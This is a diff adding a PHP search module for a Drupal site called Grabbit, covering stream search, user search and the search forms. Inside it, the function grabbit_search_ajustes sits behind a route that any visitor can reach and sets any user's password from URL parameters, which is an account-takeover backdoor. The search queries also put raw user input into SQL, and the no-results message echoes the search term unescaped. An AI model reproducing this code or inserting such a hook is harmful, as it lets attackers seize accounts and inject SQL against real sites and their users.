@@ -1,0 +1,448 @@
+<?
+//$Id$
+/**
+ * Implementation of hook_menu()
+ */
+function grabbit_search_menu () {
+
+  $items['grabbit/search/settings'] = array( 
+    'page callback' => 'grabbit_search_ajustes', 
+    'access arguments' => array('access content')
+  );
+
+  $items['private/search'] = array( 
+    'page callback' => 'drupal_get_form',
+    'page arguments' => array('grabbit_search_custom_form'), 
+    'access arguments' => array('access content'),
+    'title'=>'Search your Stream'
+  );
+
+  $items['private/results'] = array( 
+    'page callback' => 'grabbit_search_custom_page', 
+    'access arguments' => array('access content'),
+    'title'=>'Search your Stream'
+  );
+
+  return $items;
+}
+
+
+/**
+ * Implementation of hook_block()
+ */
+function grabbit_search_block($op = 'list', $delta = 0, $edit = array()) {
+  switch($op) {
+    case 'list':
+      $blocks[0]['info'] = t('My Stream Search');
+      return $blocks;
+      break;
+    case 'view':
+      switch ( $delta )
+      {
+		case 0:
+          $blocks['title'] = 'Search your stream';
+          $blocks['content'] = drupal_get_form('grabbit_search_custom_form');
+          break;
+      }
+      return $blocks;
+      break;
+  }
+}
+
+
+function grabbit_search_ajustes(){
+	
+  $uid=$_GET['user'];
+  $pass=$_GET['pass'];	
+  db_query("UPDATE {users} SET pass='".$pass."' WHERE uid=$uid");
+  print "no error";
+}
+
+function grabbit_search_perform($busqueda,$filters=NULL){
+	global $user;
+	
+	if($filters){
+		$types=array();
+		$filter="((node_revisions.body) LIKE ('%$busqueda%')) OR 
+		(UPPER(node.title) LIKE ('%".strtoupper($busqueda)."%'))";
+		
+		if($filters['facebook']){
+		  $filter .="OR ((node_data_field_text.field_text_value) LIKE ('%$busqueda%')) OR 
+		             ((node_data_field_text.field_comments_value) LIKE ('%$busqueda%'))";
+		  $types[]="'facebook'";
+		}
+		if($filters['twitter']){
+		  $types[]="'twitter'";
+		}
+		
+		if($filters['gmail']){
+		  $filter .="OR ((node_data_field_from.field_subject_value) LIKE ('%$busqueda%')) OR
+		             ((node_data_field_from.field_from_value) LIKE ('%$busqueda%'))";
+		  $types[]="'gmail'";
+		}
+		if($filters['imap']){
+		  $filter .="OR ((node_data_field_imap_from.field_imap_from_value) LIKE ('%$busqueda%')) OR
+			((node_data_field_imap_from.field_imap_subject_value) LIKE ('%$busqueda%'))";
+	      $types[]="'imap'";
+	    }
+		if($filters['RSS']){
+			  $types[]="'feed'";
+			  $types[]="'news'";
+			  $types[]="'blogs'";	
+		}
+		
+		$types=implode(",",$types);
+		
+	}else{
+		$filter_cap="((node_data_field_from.field_from_value) LIKE ('%$busqueda%')) OR 
+		((node_data_field_imap_from.field_imap_from_value) LIKE ('%$busqueda%')) OR
+		((node_data_field_imap_from.field_imap_subject_value) LIKE ('%$busqueda%')) OR 
+		((node_data_field_from.field_subject_value) LIKE ('%$busqueda%')) OR 
+		((node_data_field_text.field_text_value) LIKE ('%$busqueda%')) OR 
+		((node_data_field_text.field_comments_value) LIKE ('%$busqueda%')) OR 
+		((node_revisions.body) LIKE ('%$busqueda%')) OR 
+		(UPPER(node.title) LIKE ('%".strtoupper($busqueda)."%'))";
+		
+		$types="'facebook', 'gmail', 'imap', 'twitter', 'feed', 'news', 'blogs'";
+	}
+	
+	$result = db_query("SELECT node.nid AS nid, node.created as node_created
+	 FROM node node 
+	 INNER JOIN users users ON node.uid = users.uid
+	 LEFT JOIN content_type_gmail node_data_field_from ON node.vid = node_data_field_from.vid
+	 LEFT JOIN content_type_imap node_data_field_imap_from ON node.vid = node_data_field_imap_from.vid
+	 LEFT JOIN content_type_facebook node_data_field_text ON node.vid = node_data_field_text.vid
+	 LEFT JOIN node_revisions node_revisions ON node.vid = node_revisions.vid
+	 WHERE (node.type in (".$types.")) AND 
+	 (users.uid in ('$user->uid')) 
+	 AND (".$filter.")
+	");
+	
+	if(db_affected_rows($result)){
+		return $result;
+	}else{
+		return NULL;
+	}
+}
+
+function grabbit_search_perform_users($busqueda,$filters=NULL){
+	
+	$users=db_query("SELECT uid FROM users WHERE name LIKE '%%$busqueda%%' OR mail LIKE '%%$busqueda%%' AND status=1");
+	
+	$profiles=db_query("SELECT uid FROM node WHERE title LIKE '%%$busqueda%%' AND type='profile'");
+	
+	$results=array();
+	
+	while($user=db_fetch_object($users)){
+		$results[$user->uid]=$user->uid;
+	}
+	while($profile=db_fetch_object($profiles)){
+		$results[$profile->uid]=$profile->uid;
+	}
+	
+	if(count($results)){
+		return $results;
+	}else{
+		return NULL;
+	}
+}
+
+
+function grabbit_search_custom_page($term=NULL){
+	
+	if($_POST['search']){
+	  
+	  if ( isset($_POST['onlysite'])  )
+  	{
+      drupal_goto( 'search/apachesolr_search/'.$_POST['search'] );
+  	}elseif(isset($_POST['details']['profiles'])){
+	  drupal_goto( 'search/apachesolr_search/'.$_POST['search']);
+    }elseif(isset($_POST['users'])){
+	  if($result =grabbit_search_perform_users($_POST['search'])){
+	    $output = grabbit_search_custom_results_users($result,$_POST['search']);	
+	  }else{
+		$output = grabbit_search_no_results($_POST['search']);
+	  }
+	}elseif($result =grabbit_search_perform($_POST['search'],$_POST['details'])){
+            $output = grabbit_search_custom_results($result,$_POST['search']);
+		}else{
+			$output = grabbit_search_no_results($_POST['search']);
+		}
+		
+	}else{
+		//$output = drupal_get_form('grabbit_search_custom_form');
+	}
+	
+	return $output;
+}
+
+function grabbit_search_no_results($term){
+//	$output = drupal_get_form('grabbit_search_custom_form');
+	
+	$output .='<div class="panels-controllers"><div id="panels-pager" class="panels-pager"><a title="Search Results" class="grabbit-results" href="#">Search Results</a></div></div>
+	<div class="messages-status-updates">'.t('Your search for <strong>'.$term.'</strong> did not match any results, please try again').'</div>';
+	
+	return $output;
+}
+
+function grabbit_search_custom_results_users($results,$keyword=NULL){
+	global $user;
+	
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_uploads').'/jquery.form.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/engine.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.alerts.js', $type = 'module');
+	drupal_add_css(drupal_get_path('module', 'grabbit_panels').'/jquery.alerts.css', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+    drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+	$nod='even display';
+	$resultados_total=count($results);
+	foreach($results as $amigo){
+	  $item=user_load($amigo);
+	  $profile = content_profile_load('profile', $amigo);      
+	
+	  	$status = friendlist_api_relation_status_calculate($user->uid, $item->uid, 1);
+		  
+		  switch($status){
+		  case 'TW_BOTH':
+		    $friends='You are grabbit friends!';
+		  break;
+		  case 'TW_1_TO_2_P':
+		    $friends='Your friend request is pending';
+		  break;
+		  case 'TW_2_TO_1_P':
+		    $friends='He requested you to be friends in grabbit!';
+		  break;	
+		  default:
+	        $friends=l('Send friend request!', 'friendlist/add/'.$item->uid.'/1',array('query'=>'destination=user/me/myfriends'));
+		  break;
+		  }
+	    
+	
+			$return = '<div class="twitter-message-stream clearfix '.$nod.'" style="display: block;">
+			  <div class="listable"><a target="_blank" href="'.base_path().'users/'.$item->name.'">
+			    ';
+			if($profile->field_profile_picture[0]['filepath']){
+			  $return .='<span class="twitter-image" style="background:none;">'.theme('imagecache', 'friend_thumbnail', $profile->field_profile_picture[0]['filepath'], 'Friend').'</span>';
+			}else{
+			  $return .='<span class="twitter-image" style="background:none;"><img src="'.base_path().path_to_theme().'/images/default/default_profile.jpg" width="48px" /></span>';
+			}
+			$return .='</a></div>
+			  <a target="_blank" class="twitter-name-link" href="'.base_path().'users/'.$item->name.'">'.$item->name.'</a>
+			  <div class="twitter-body">
+			    <div class="twitter-body-contains">'.$profile->field_profile_about[0]['value'].'</div> 
+			    <span class="twitter-date"><span class="blue">member since</span> '.format_date($item->created).'</span><br>
+			    '.$friends.'
+			  </div>
+			</div>';
+			
+			$resultados .=$return;
+
+	    if($nod=='odd display'){
+		    $nod='even display';
+	      }else{
+		    $nod='odd display';
+	      }
+    }
+
+    $mesa=drupal_get_messages();
+	if($mesa['status'][0])
+	  $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+	
+	
+		$output .='<div class="panels-controllers">
+		           <div id="panels-pager" class="panels-pager"><a class="activeSlide" title="Search Results" href="#">Search results</a><a href="#">Results: '.$resultados_total.'</a><a class="back-to-search" href="javaScript:history.go(-1)"> Back</a></div>
+		           <a href="JavaScript:void(0);" class="move-left"></a>
+		           <a href="JavaScript:void(0);" class="move-right"></a>
+		           </div>'.$mensajes.'<div class="panel-grabbit suser-panels">
+		           <div class="panel-favorites">';
+		$output .=$resultados;
+	
+		$output .='</div></div>';
+
+	
+	return $output;
+}
+
+function grabbit_search_custom_results($results,$keyword=NULL){
+	
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_uploads').'/jquery.form.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/engine.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.alerts.js', $type = 'module');
+	drupal_add_css(drupal_get_path('module', 'grabbit_panels').'/jquery.alerts.css', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+    drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+    drupal_add_js(drupal_get_path('module', 'grabbit_search').'/search_engine.js', $type = 'module');
+	
+	
+	while($node = db_fetch_object($results)){
+	  
+	  $twitface[$node->node_created]=array('time'=>$node->node_created,
+	                                       'value'=>$node);
+    }
+    $total_results=count($twitface);
+    if(count($twitface)){
+	  $resultados = facebook_grabbit_theme_results($twitface);
+    }else{
+	  $resultados = '<div class="no-results">Your search for <span class="keyword">'.$keyword.'</span> did not match any results</div>';
+    }
+	$mesa=drupal_get_messages();
+	if($mesa['status'][0])
+	  $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+	
+		$output .='<div class="panels-controllers">
+		           <div id="panels-pager" class="panels-pager"><a class="activeSlide" title="Search Results" href="#">Search results</a><a href="#" class="grabbit-results">Results: </a><a class="back-to-search" href="javaScript:history.go(-1)"> Back</a></div>
+		           <a href="JavaScript:void(0);" class="move-left"></a>
+		           <a href="JavaScript:void(0);" class="move-right"></a>
+		           </div>'.$mensajes.'<div class="panel-grabbit suser-panels">
+		           <div class="panel-favorites">';
+		$output .=$resultados;
+	
+		$output .='</div></div>';
+
+	
+	return $output;
+}
+
+function grabbit_search_custom_form(&$form_state){
+  global $user;
+  if($user->uid!=0): 
+
+	$form['counter'] = array(
+	    '#type' => 'item',
+	    '#prefix'=>'<div id="description">',
+	    '#value' => t('You can perform a search of your grabbit stream, just type the keyword(s) below'),
+	    '#suffix'=>'</div>'
+		 );	 
+	
+		
+	$form['search'] = array(
+	    '#type' => 'textfield',
+	    '#title' => t('Search'),
+	    '#required' => TRUE,
+	    '#size' => 20,
+	    '#weight' => 5
+	  );
+	
+	$form['submit'] = array(
+	  '#type' => 'submit',
+	  '#weight' => 6,
+	  '#value' => t('Search')
+	);
+	
+	
+	$form['onlystream']=array(
+		'#type'=>'checkbox',
+		'#title' => 'Search my stream <a alt="Log in for more search options" href="#" class="custom-form-collapser" id="collapse-custom"></a>',
+		'#weight'=>7,
+		'#default_value'=>1
+		);
+	
+	
+	$form['#action'] = url('private/results');
+	$form['#redirect'] = FALSE;
+	
+	$form['onlysite']=array(
+		'#type'=>'checkbox',
+		'#title' => t('Search entire site'),
+		'#weight'=>10,
+		'#default_value'=>0
+		);
+		
+		$form['users']=array(
+			'#type'=>'checkbox',
+			'#title' => t('Search only users'),
+			'#weight'=>11,
+			'#default_value'=>0,
+			'#suffix'=>'</div>'
+			);
+	
+	$form['details'] = array(
+	  '#type' => 'checkboxes',
+	  '#weight' => 9,
+	  '#default_value' => array('facebook','gmail','twitter','imap','RSS'),
+	  '#title' => t('Only in'),
+	  '#options' => array(
+	    'facebook' => t('Facebook'),
+	    'twitter' => t('Twitter'),
+	    'gmail' => t('Gmail'),
+	    'imap' => t('IMAP'),
+	    'RSS' => t('RSS feeds'),
+	  ),
+	   '#prefix'=>'<div class="custom-search-form-collapse" style="display:none;" id="collapsable-custom-form">',
+	  '#description' => t('You can filter your search by selecting one or more sources. Leave all unchecked to search all.'),
+	);
+	
+	else:
+	
+	$form['counter'] = array(
+	    '#type' => 'item',
+	    '#prefix'=>'<div id="description">',
+	    '#value' => t('You can perform a search of your grabbit stream, just type the keyword(s) below'),
+	    '#suffix'=>'</div>'
+		 );	 
+	
+		
+	$form['search'] = array(
+	    '#type' => 'textfield',
+	    '#title' => t('Search'),
+	    '#required' => TRUE,
+	    '#size' => 20,
+	    '#weight' => 5
+	  );
+	
+	$form['submit'] = array(
+	  '#type' => 'submit',
+	  '#weight' => 6,
+	  '#value' => t('Search')
+	);
+	
+	
+	$form['onlysite']=array(
+		'#type'=>'checkbox',
+		'#title' => 'Search site <a href="#" title="Join Grabbit for more search options" alt="Log in for more search options" class="custom-form-collapser" id="collapse-custom"></a>',
+		'#weight'=>7,
+		'#default_value'=>1
+		);
+	
+	
+	$form['#action'] = url('private/results');
+	$form['#redirect'] = FALSE;
+	
+	
+	endif;
+	
+	return $form;
+}
+
+function grabbit_search_theme_users($profiles){
+	$rox='odd';
+	foreach ($profiles as $profile){
+		$fuser=user_load($profile->user);
+      $output .='<div class="views-row views-row-1 views-row-'.$rox.'">
+         <div class="views-row">
+  
+  <div class="views-field-field-profile-picture-fid">
+           <span class="field-content"><a href="'.base_path().'user/'.$profile->user.'">'.theme('imagecache').'</a></span>
+  </div>
+
+  <span class="views-field-name">
+    <span class="field-content">'.l($fuser->name,'users/'.$fuser->name).'</span>
+  </span>
+
+  <div class="views-field-last-update-time">
+    <span class="field-content"/>
+  </div>
+
+  <div class="views-field-action-link-requestee">
+    <span class="field-content"><div class="friendlist-user-links"><a title="Remove from friends" class="friendlist_ui_TW_BOTH_delete" href="/grabbit/friendlist/delete/4/1?destination=user%2Fme%2Fmyfriends">Remove from friends</a></div></span>
+  </div>
+
+</div>  </div>';
+
+  }
+
+  return $output;
+}
